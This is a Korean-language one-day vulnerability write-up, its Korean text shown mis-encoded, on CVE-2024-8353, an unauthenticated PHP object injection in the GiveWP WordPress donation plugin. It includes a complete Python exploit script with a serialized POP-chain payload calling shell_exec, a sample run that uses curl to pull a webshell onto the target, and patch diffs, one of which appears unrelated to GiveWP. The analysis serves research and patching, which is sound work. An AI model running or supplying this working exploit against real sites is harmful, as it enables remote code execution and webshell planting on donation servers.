---
title: "[CVE-2024-8353] ì·¨ì•½ì  ë¶„ì„ ë³´ê³ ì„œ"
date: 2025-02-21 19:02:00 +0900
author: rlaaudrb1104
categories: [One-Day ë¶„ì„, WordPress]
tags: [ë¹¡ê³µíŒŸ,ì½˜í…ŒìŠ¤íŠ¸ ë„¤ë·¸ë¼,WordPress, GiveWP, CVE-2024-8353, PHP Object Injection]
image: assets/img/wordpress-thumbnail.png
exclude_img: true
---

> ## **ğŸ’¡ ìš”ì•½**  
> **CVE-2024-8353**ì€ WordPressì˜ ê¸°ë¶€ ë° ëª¨ê¸ˆ í”Œë«í¼ í”ŒëŸ¬ê·¸ì¸ì¸ GiveWPì—ì„œ ë°œê²¬ëœ **PHP Object Injection** ì·¨ì•½ì ì…ë‹ˆë‹¤.  
> ì´ ì·¨ì•½ì ì€ GiveWP 3.16.1 ì´í•˜ ë²„ì „ì—ì„œ `give_title` ë° `card_address`ì™€ ê°™ì€ íŒŒë¼ë¯¸í„°ë¥¼ í†µí•œ ì‹ ë¢°í•  ìˆ˜ ì—†ëŠ” ì…ë ¥ì˜ ì—­ì§ë ¬í™”ë¡œ ì¸í•´ ë°œìƒí•˜ë©°,  
> ì¸ì¦ë˜ì§€ ì•Šì€ ê³µê²©ìê°€ PHP ê°ì²´ë¥¼ ì£¼ì…í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë˜í•œ, **POP(Property Oriented Programming) Chain**ì˜ ì¡´ì¬ë¡œ ì¸í•´  
> ê³µê²©ìëŠ” ì„ì˜ì˜ íŒŒì¼ ì‚­ì œë‚˜ ì›ê²© ì½”ë“œ ì‹¤í–‰ì„ ìˆ˜í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

## 1. ì·¨ì•½ì  ê°œìš”

- **ì·¨ì•½ì  ë²ˆí˜¸:** CVE-2024-8353  
- **ì˜í–¥ ë°›ëŠ” ë²„ì „:** GiveWP 3.16.1 ì´í•˜  
- **ì·¨ì•½ì  ìœ í˜•:** PHP Object Injection  
- **CVSS:** 10.0  
- **ì·¨ì•½ì  íŒ¨ì¹˜ ë²„ì „:** 3.16.2  

í•´ë‹¹ ì·¨ì•½ì ì€ WordPressì˜ ê¸°ë¶€ ë° ëª¨ê¸ˆ í”ŒëŸ¬ê·¸ì¸ì¸ `GiveWP`ì—ì„œ ë°œê²¬ëœ PHP Object Injection ì·¨ì•½ì ì…ë‹ˆë‹¤.  
ì…ë ¥ íŒŒë¼ë¯¸í„° `give_title` ë° `card_address`ì˜ ì—­ì§ë ¬í™”ë¥¼ í†µí•´ ê³µê²©ìê°€ ì•…ì˜ì ì¸ ê°ì²´ë¥¼ ì‚½ì…í•˜ê³ ,  
POP(Property Oriented Programming) ì²´ì¸ì„ ì´ìš©í•˜ì—¬ ì›ê²© ì½”ë“œ ì‹¤í–‰ ë° ì„ì˜ íŒŒì¼ ì‚­ì œ ë“±ì˜ ê³µê²©ì´ ê°€ëŠ¥í•©ë‹ˆë‹¤.

## 2. ì·¨ì•½ì  ìƒì„¸

### 2.1 ì·¨ì•½ì  ì›ì¸

`give_process_donation_form()` í•¨ìˆ˜ëŠ” ì‚¬ìš©ìì˜ ê¸°ë¶€ ë°ì´í„°ë¥¼ ì²˜ë¦¬í•˜ëŠ” í•µì‹¬ ê¸°ëŠ¥ì„ ë‹´ë‹¹í•©ë‹ˆë‹¤.  
ì£¼ìš” ì²˜ë¦¬ íë¦„ì€ ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤:

1. ì‚¬ìš©ìê°€ ê¸°ë¶€ í¼ì„ ì œì¶œí•˜ë©´ `$_POST` ë°ì´í„°ë¥¼ ë°›ì•„ `give_clean()` í•¨ìˆ˜ë¥¼ í†µí•´ í•„í„°ë§í•©ë‹ˆë‹¤.
2. í¼ì˜ AJAX ì œì¶œ ì—¬ë¶€ë¥¼ í™•ì¸í•˜ê³ , `give_verify_donation_form_nonce()`ë¥¼ í†µí•´ CSRF í† í°ì„ ê²€ì¦í•©ë‹ˆë‹¤.
3. `give_donation_form_has_serialized_fields()` í•¨ìˆ˜ë¥¼ í†µí•´ ìœ íš¨ì„± ê²€ì‚¬ë¥¼ ìˆ˜í–‰í•©ë‹ˆë‹¤.
4. `give_get_donation_form_user()` í•¨ìˆ˜ë¥¼ í†µí•´ ì‚¬ìš©ì ë°ì´í„°ë¥¼ ë¡œë“œí•©ë‹ˆë‹¤.
5. ì‚¬ìš©ì ì •ë³´ê°€ ì ì ˆí•œì§€ í™•ì¸í•œ í›„ ê¸°ë¶€ ì •ë³´ë¥¼ ì„¤ì •í•˜ê³  ê²°ì œ ê²Œì´íŠ¸ì›¨ì´ë¡œ ì „ì†¡í•©ë‹ˆë‹¤.
### 2.2 ì·¨ì•½ì  ìš°íšŒ ë° ë¬¸ì œì 
<details>
    <summary><b>ì „ì²´ ì½”ë“œ</b></summary>
    
```php
function give_process_donation_form() {

    // Sanitize Posted Data.
    $post_data = give_clean( $_POST ); // WPCS: input var ok, CSRF ok.

    // Check whether the form submitted via AJAX or not.
    $is_ajax = isset( $post_data['give_ajax'] );

    // Verify donation form nonce.
    if ( ! give_verify_donation_form_nonce( $post_data['give-form-hash'], $post_data['give-form-id'] ) ) {
        if ( $is_ajax ) {
            do_action( 'give_ajax_donation_errors' );
            give_die();
        } else {
            give_send_back_to_checkout();
        }
    }

    do_action( 'give_pre_process_donation' );

    // Validate the form $_POST data.
    $valid_data = give_donation_form_validate_fields();

    $deprecated = $post_data;
    do_action( 'give_checkout_error_checks', $valid_data, $deprecated );

    // Process the login form.
    if ( isset( $post_data['give_login_submit'] ) ) {
        give_process_form_login();
    }

    // Validate the user.
    $user = give_get_donation_form_user( $valid_data );

    if ( false === $valid_data || ! $user || give_get_errors() ) {
        if ( $is_ajax ) {
            do_action( 'give_ajax_donation_errors' );
            give_die();
        } else {
            return false;
        }
    }

    // If AJAX send back success to proceed with form submission.
    if ( $is_ajax ) {
        echo 'success';
        give_die();
    }

    do_action( 'give_process_donation_after_validation' );

    // Setup user information.
    $user_info = [
        'id'         => $user['user_id'],
        'title'      => $user['user_title'],
        'email'      => $user['user_email'],
        'first_name' => $user['user_first'],
        'last_name'  => $user['user_last'],
        'address'    => $user['address'],
    ];

    $auth_key = defined( 'AUTH_KEY' ) ? AUTH_KEY : '';

    // Donation form ID.
    $form_id = isset( $post_data['give-form-id'] ) ? absint( $post_data['give-form-id'] ) : 0;

    $price = isset( $post_data['give-amount'] ) ?
        (float) apply_filters( 'give_donation_total', give_maybe_sanitize_amount( $post_data['give-amount'], [ 'currency' => give_get_currency( $form_id ) ] ) ) :
        '0.00';
    $purchase_key = strtolower( md5( $user['user_email'] . date( 'Y-m-d H:i:s' ) . $auth_key . uniqid( 'give', true ) ) );

    $purchase_key = apply_filters(
        'give_donation_purchase_key',
        $purchase_key,
        $valid_data['gateway'],
        $purchase_key
    );

    // Setup donation information.
    $donation_data = [
        'price'        => $price,
        'purchase_key' => $purchase_key,
        'user_email'   => $user['user_email'],
        'date'         => date( 'Y-m-d H:i:s', current_time( 'timestamp' ) ),
        'user_info'    => stripslashes_deep( $user_info ),
        'post_data'    => $post_data,
        'gateway'      => $valid_data['gateway'],
        'card_info'    => $valid_data['cc_info'],
    ];

    // Add the user data for hooks.
    $valid_data['user'] = $user;

    do_action( 'give_checkout_before_gateway', $post_data, $user_info, $valid_data );

    // Sanity check for price.
    if ( ! $donation_data['price'] ) {
        // Revert to manual.
        $donation_data['gateway'] = 'manual';
        $_POST['give-gateway']    = 'manual';
    }

    $donation_data = apply_filters( 'give_donation_data_before_gateway', $donation_data, $valid_data );

    // Setup the data we're storing in the donation session.
    $session_data = $donation_data;

    // Make sure credit card numbers are never stored in sessions.
    unset( $session_data['card_info']['card_number'] );
    unset( $session_data['post_data']['card_number'] );

    // Used for showing data to non logged-in users after donation, and for other plugins needing donation data.
    give_set_purchase_session( $session_data );

    ob_start();
    // Send info to the gateway for payment processing.
    give_send_to_gateway( $donation_data['gateway'], $donation_data );
    ob_get_clean();
    give_die();
}
```

</details>



```php
$post_data = give_clean( $_POST );
...
if ( ! give_verify_donation_form_nonce( $post_data['give-form-hash'], $post_data['give-form-id'] ) ) {
    give_send_back_to_checkout();
}
...
if (give_donation_form_has_serialized_fields($post_data)) {
    give_set_error('invalid_serialized_fields', esc_html__('Serialized fields detected. Go away!', 'give'));
}
...
$user = give_get_donation_form_user( $valid_data );
$donation_data = [
    'user_info' => stripslashes_deep( $user_info ),
    'post_data' => $post_data,
];
...
give_send_to_gateway( $donation_data['gateway'], $donation_data );
```

`give_donation_form_has_serialized_fields()` í•¨ìˆ˜ë¥¼ í†µí•´ ìœ íš¨ì„± ê²€ì‚¬ë¥¼ ìˆ˜í–‰í•˜ì§€ë§Œ `give_title` ë§¤ê°œë³€ìˆ˜ëŠ” ê²€ì‚¬ë¥¼ ìš°íšŒí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

```php
if (empty($user['user_title']) || strlen(trim($user['user_title'])) < 1) {
    $user['user_title'] = !empty($post_data['give_title']) ? strip_tags(trim($post_data['give_title'])) : '';
}
```
ìœ„ ë°ì´í„°ëŠ” `give_send_to_gateway()` í•¨ìˆ˜ë¥¼ í†µí•´ ê²Œì´íŠ¸ì›¨ì´ì— ì „ì†¡ë˜ê³ , ê·¸ ê³¼ì •ì—ì„œ ë°ì´í„°ë² ì´ìŠ¤ì— ë‹¤ìŒê³¼ ê°™ì´ ì €ì¥ë©ë‹ˆë‹¤.

```php
DB::table('give_donors')
    ->insert($args);
 
$donorId = DB::last_insert_id();
 
foreach ($this->getCoreDonorMeta($donor) as $metaKey => $metaValue) {
    DB::table('give_donormeta')
        ->insert([
            'donor_id' => $donorId,
            'meta_key' => $metaKey,
            'meta_value' => $metaValue,
        ]);
}
```
ì´í›„ ê¸°ë¶€ì ë©”íƒ€ë°ì´í„°ë¥¼ ì €ì¥í•˜ëŠ” ê³¼ì •ì—ì„œ `_give_donor_title_prefix` í‚¤ë¡œ ì§ë ¬í™”ëœ ë°ì´í„°ê°€ ì €ì¥ë˜ë©°, ë‚˜ì¤‘ì— ì—­ì§ë ¬í™”ë©ë‹ˆë‹¤.

```php
private function getCoreDonorMeta(Donor $donor): array
{
    return [
        DonorMetaKeys::FIRST_NAME => $donor->firstName,
        DonorMetaKeys::LAST_NAME => $donor->lastName,
        DonorMetaKeys::PREFIX => $donor->prefix ?? null,
    ];
}

$user_info[ $key ] = Give()->donor_meta->get_meta( $donor->id, '_give_donor_title_prefix', true );
```
ê²€ì¦ í•¨ìˆ˜ `give_donation_form_has_serialized_fields()`ë¥¼ í†µí•´ ìœ íš¨ì„± ê²€ì‚¬ë¥¼ ìˆ˜í–‰í•¨ì—ë„ ë¶ˆêµ¬í•˜ê³ , ì•„ë˜ì™€ ê°™ì´ `give_title` íŒŒë¼ë¯¸í„°ëŠ” í•„í„°ë§ì„ ìš°íšŒí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

```php
if (empty($user['user_title']) || strlen(trim($user['user_title'])) < 1) {
    $user['user_title'] = !empty($post_data['give_title']) ? strip_tags(trim($post_data['give_title'])) : '';
}
```
ì´ ë°ì´í„°ëŠ” `give_send_to_gateway()` í•¨ìˆ˜ë¥¼ í†µí•´ ê²°ì œ ê²Œì´íŠ¸ì›¨ì´ë¡œ ì „ì†¡ë˜ê³ ,
ë°ì´í„°ë² ì´ìŠ¤ì— ì§ë ¬í™”ëœ ìƒíƒœë¡œ ì €ì¥ë©ë‹ˆë‹¤. ì´í›„ ê¸°ë¶€ì ë©”íƒ€ë°ì´í„°ë¥¼ ì €ì¥í•˜ëŠ” ê³¼ì •ì—ì„œ
`_give*_*donor_title_prefix` í‚¤ë¡œ ì €ì¥ëœ ì§ë ¬í™” ë°ì´í„°ê°€ ì—­ì§ë ¬í™”ë˜ë©°, ê³µê²©ìëŠ” ì´ë¥¼ í†µí•´
POP ì²´ì¸ì„ ì´ìš©í•˜ì—¬ ì›ê²© ëª…ë ¹ ì‹¤í–‰, ì›¹ì‰˜ ì—…ë¡œë“œ ë“±ì˜ ê³µê²©ì„ ìˆ˜í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

## 3. PoC
### 3.1 PoC ì½”ë“œ
```python
import requests
from faker import Faker
from urllib.parse import urlparse
import time
import sys
import rich_click as click

requests.packages.urllib3.disable_warnings(
    requests.packages.urllib3.exceptions.InsecureRequestWarning
)

class GiveWPExploit:

    def __init__(self, url: str, cmd: str):
        self.url = url
        self.cmd = cmd
        self.formId = None

    def spinner(duration=10, interval=0.1) -> None:
        spinner_chars = ['|', '/', '-', '\\']
        end_time = time.time() + duration
        while time.time() < end_time:
            for char in spinner_chars:
                sys.stdout.write(f'\r[{char}] Exploit loading, please wait...')
                sys.stdout.flush()
                time.sleep(interval)
        print("")

    def getBaseUrl(self, url) -> str:
        parsed_url = urlparse(url)
        base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
        return base_url

    def getFormId(self) -> None:
        baseUrl = self.getBaseUrl(self.url)
        reqUrl = f"{baseUrl}/wp-admin/admin-ajax.php"
        data = {
            'action': 'give_form_search'
        }
        response = requests.post(reqUrl, data=data)
        if response.status_code == 200: 
            json_data = response.json()
            ids = [item['id'] for item in json_data]
            names = [item['name'] for item in json_data]
            print("[+] Donation Forms:")
            for id, name in zip(ids, names):
                print(f"    {id}: {name}")
            self.formId = input("[+] Choose one (id) >>> ").strip()
        else:
            print(f"[-] HTTP Request Failed: {response.status_code}")
            exit(1)

    def getNonce(self) -> str:
        baseUrl = self.getBaseUrl(self.url)
        reqUrl = f"{baseUrl}/wp-admin/admin-ajax.php"
        self.getFormId()
        data = {
            'action': 'give_donation_form_nonce',
            'give_form_id': self.formId
        }
        response = requests.post(reqUrl, data=data)
        if response.status_code == 200: 
            json_data = response.json()
            nonce = json_data['data']
            print(f"[+] Nonce Found!! {nonce}")
            return nonce
        else:
            print(f"[-] HTTP Request Failed: {response.status_code}")
            exit(1)

    def getParams(self) -> dict:
        give_form_hash = self.getNonce()
        give_form_id = self.formId
        # Can be modified, form's first price's id =0, amount = price
        give_price_id = "0"
        give_amount = "10"

        # Fake Userinfo
        fake = Faker()
        params = {"give-form-id" : give_form_id, 
                  "give-form-hash" : give_form_hash, 
                  "give-price-id" : give_price_id,
                  "give-amount" : give_amount,
                  "give_first": fake.first_name(),
                  "give_last": fake.last_name(),
                  "give_email": fake.email()}
        return params


    def getData(self) -> dict:
        cmd = self.cmd
        payload = '\\O:19:"Stripe\\\\\\\\StripeObject":1:{s:10:"\\0*\\0_values";a:1:{s:3:"foo";O:62:"Give\\\\\\\\PaymentGateways\\\\\\\\DataTransferObjects\\\\\\\\GiveInsertPaymentData":1:{s:8:"userInfo";a:1:{s:7:"address";O:4:"Give":1:{s:12:"\\0*\\0container";O:33:"Give\\\\\\\\Vendors\\\\\\\\Faker\\\\\\\\ValidGenerator":3:{s:12:"\\0*\\0validator";s:10:"shell_exec";s:12:"\\0*\\0generator";O:34:"Give\\\\\\\\Onboarding\\\\\\\\SettingsRepository":1:{s:11:"\\0*\\0settings";a:1:{s:8:"address1";s:%d:"%s";}}s:13:"\\0*\\0maxRetries";i:10;}}}}}}' % (len(cmd), cmd)
        data = self.getParams()
        data['give_title'] = payload
        data['give-gateway'] = 'offline'
        data['action'] = 'give_process_donation'
        print(f"[+] Requested Data: ")
        print(data)
        return data
        
    def sendRequest(self) -> None:
        # Fake User_Agent
        fake = Faker()
        baseUrl = self.getBaseUrl(self.url)
        reqUrl = f"{baseUrl}/wp-admin/admin-ajax.php"
        data = self.getData()
        headers = {
            'User-Agent': fake.user_agent(),
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Accept-Encoding': 'gzip, deflate, br'
        }
        response = requests.post(reqUrl, data=data, headers=headers)

    def exploit(self) -> None:
        self.sendRequest()

# argument parsing with rich_click
@click.command()
@click.option(
    "-u",
    "--url",
    required=True,
    help="Specify a URL or domain for vulnerability detection (Donation-Form Page)",
)
@click.option(
    "-c",
    "--cmd",
    default="/tmp/test",
    help="Specify the file to read from the server",
)

def main(url: str, cmd: str) -> None:
    cve_exploit = GiveWPExploit(url, cmd)
    GiveWPExploit.spinner(duration=1)
    cve_exploit.exploit()

if __name__ == "__main__":
    main()
```
[ì¶œì²˜] https://github.com/EQSTLab/CVE-2024-8353
### 3.2 ì£¼ìš” ê¸°ëŠ¥
PoC ì½”ë“œëŠ” ë‹¤ìŒê³¼ ê°™ì€ ê¸°ëŠ¥ì„ í¬í•¨í•©ë‹ˆë‹¤:

1. **getBaseUrl()**: ì…ë ¥ëœ URLì—ì„œ ê¸°ë³¸ ë„ë©”ì¸ ë° ê²½ë¡œ ì¶”ì¶œ
2. **getFormId()**: WordPressì˜ AJAX ìš”ì²­ì„ í†µí•´ ê¸°ë¶€ í¼ ID ì¡°íšŒ ë° ì„ íƒ
3. **getNonce()**: ì„ íƒí•œ í¼ IDì— ëŒ€í•œ ë³´ì•ˆ í† í°(Nonce) íšë“
4. **getParams()**: Faker ë¼ì´ë¸ŒëŸ¬ë¦¬ë¥¼ ì´ìš©í•´ ê°€ì§œ ì‚¬ìš©ì ë°ì´í„°ë¥¼ ìƒì„±í•˜ê³  ê¸°ë¶€ ë°ì´í„° êµ¬ì„±
5. **getData()**: ì›ê²© ì½”ë“œ ì‹¤í–‰ í˜ì´ë¡œë“œë¥¼ êµ¬ì„±í•˜ì—¬ give_titleì— ì•…ì˜ì  í˜ì´ë¡œë“œ ì‚½ì…
6. **sendRequest()**: ì¡°ì‘ëœ ë°ì´í„°ë¥¼ HTTP POST ë°©ì‹ìœ¼ë¡œ ì „ì†¡í•˜ì—¬ ê³µê²© ì‹¤í–‰
### 3.3 PoC ì‹¤í–‰ íë¦„
1. ì‚¬ìš©ìê°€ URL ì…ë ¥
2. ìŠ¤í¬ë¦½íŠ¸ê°€ ê¸°ë¶€ í¼ IDë¥¼ ì¡°íšŒ
3. í•´ë‹¹ í¼ì˜ Nonce í† í° íšë“
4. give_titleì— ì¡°ì‘ëœ í˜ì´ë¡œë“œ(ì˜ˆ: shell_exec í•¨ìˆ˜ í˜¸ì¶œ) ì‚½ì…
5. ì„œë²„ì— ì•…ì˜ì  ìš”ì²­ ì „ì†¡ â†’ ì›ê²© ì½”ë“œ ì‹¤í–‰ ìœ ë„
### 3.4 Payload
ê³µê²©ìëŠ” ì•„ë˜ì˜ ì§ë ¬í™”ëœ ê°ì²´ë¥¼ í™œìš©í•˜ì—¬ `shell_exec` í•¨ìˆ˜ë¥¼ ì‹¤í–‰í•©ë‹ˆë‹¤.
```
payload = '\\O:19:"Stripe\\\\StripeObject":1:{s:10:"\\0*\\0_values";a:1:{s:3:"foo";O:62:"Give\\\\PaymentGateways\\\\DataTransferObjects\\\\GiveInsertPaymentData":1:{s:8:"userInfo";a:1:{s:7:"address";O:4:"Give":1:{s:12:"\\0*\\0container";O:33:"Give\\\\Vendors\\\\Faker\\\\ValidGenerator":3:{s:12:"\\0*\\0validator";s:10:"shell_exec";}}}}}}'
```
ìœ„ í˜ì´ë¡œë“œëŠ” ì„œë²„ì—ì„œ `shell_exec()` í˜¸ì¶œì„ ë°œìƒì‹œì¼œ ì•…ì˜ì ì¸ ëª…ë ¹ì„ ì‹¤í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

## 4. PoC ì‹¤ìŠµ
í…ŒìŠ¤íŠ¸ í™˜ê²½(wordpress 6.3.2, GiveWP 3.16.0)ì—ì„œ ê¸°ë¶€ í¼ì„ ì‘ì„±í•©ë‹ˆë‹¤.

![image.png](/assets/posts/one-day/2025-02-21/image-003.png)

PoCì½”ë“œë¥¼ ì‹¤í–‰í•©ë‹ˆë‹¤.
```
python3 CVE-2024-8353.py -u http://localhost:8080/?p=9 -c "curl -O https://rlaaudrb1104.github.io/test_webshell.php"
```
ì›¹ì‰˜ì„ ì„±ê³µì ìœ¼ë¡œ ì—…ë¡œë“œ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

![image.png](/assets/posts/one-day/2025-02-21/image-004.png)

## 5. íŒ¨ì¹˜ ë‚´ìš© ë° ë³€ê²½ì‚¬í•­ ë¶„ì„
```diff
@@
- $user_info = stripslashes_deep( $user_info );
+ $user_info = array_map('\Give\Helpers\Utils::maybeSafeUnserialize', stripslashes_deep( $user_info ));
@@
-     'user_info'    => stripslashes_deep( $user_info ),
+     'user_info'    => $user_info,
```

```diff
- $question            = $params['question'];
- $conversation        = $params['conversation'];
- $unique_conversation = $params['unique_conversation'];
+ $question            = sanitize_text_field($params['question']);
+ $conversation = array_map(function($conv) {
+ return [
+ 'text' => sanitize_text_field($conv['text']),
+ 'role' => sanitize_text_field($conv['role']),
+ 'date' => sanitize_text_field($conv['date'])
+ ];
+ }, $params['conversation']);
+ $unique_conversation = sanitize_text_field($params['unique_conversation']);
```

í•´ë‹¹ ì·¨ì•½ì ì— ëŒ€í•œ íŒ¨ì¹˜ëŠ” `stripslashes_deep()` í•¨ìˆ˜ì˜ ì—­ì§ë ¬í™” ìš°íšŒ ë¬¸ì œë¥¼ í•´ê²°í•˜ëŠ” ë°©ì‹ìœ¼ë¡œ ì ìš©ë˜ì—ˆìŠµë‹ˆë‹¤. 
ì´ë¥¼ í†µí•´ ê³µê²©ìê°€ ì§ë ¬í™”ëœ ì•…ì˜ì ì¸ ë°ì´í„°ë¥¼ ì£¼ì…í•  ìˆ˜ ì—†ë„ë¡ ë°©ì§€í•©ë‹ˆë‹¤.


## ì°¸ê³ ìë£Œ

https://www.wordfence.com/blog/2024/08/4998-bounty-awarded-and-100000-wordpress-sites-protected-against-unauthenticated-remote-code-execution-vulnerability-patched-in-givewp-wordpress-plugin/

https://github.com/EQSTLab/CVE-2024-8353